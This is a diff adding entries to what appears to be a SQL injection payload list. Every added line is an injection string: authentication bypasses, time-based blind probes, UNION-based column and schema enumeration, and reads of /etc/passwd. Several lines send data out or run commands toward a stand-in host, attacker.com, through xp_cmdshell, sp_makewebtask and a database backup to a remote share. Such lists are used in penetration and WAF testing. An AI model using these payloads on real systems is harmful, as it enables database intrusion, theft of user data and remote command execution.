@@ -29,3 +29,28 @@
 ' AND '1'='1'#
 ' AND 1=1/*
 ' AND 'a'='a'
+UNION ALL SELECT @@version
+' WAITFOR DELAY '0:0:10'--
+') OR '1'='1'-- 
+' OR EXISTS(SELECT * FROM users)--
+admin'--
+' UNION SELECT sum(columnname) from tablename--
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP) AND 'a'='a
+%' AND 8310=8310 AND '%'='
+1' ORDER BY 1--+
+1' ORDER BY 2--+
+1' ORDER BY 3--+
+1' GROUP BY 1--+
+1' GROUP BY 2--+
+1' GROUP BY 3--+
+UNION SELECT NULL,NULL,NULL--
+UNION SELECT @@hostname,@@version,@@datadir
+' HAVING 1=1--
+) UNION SELECT NULL,NULL,NULL--
+' UNION ALL SELECT table_name,2,3 FROM information_schema.tables--
+' UNION ALL SELECT column_name,2,3 FROM information_schema.columns--
+'; EXEC xp_cmdshell 'ping attacker.com'--
+'; EXEC sp_makewebtask 'attacker.com','select * from users'--
+'; BACKUP DATABASE master TO DISK='\\attacker.com\share\'--
+UNION ALL SELECT LOAD_FILE('/etc/passwd')
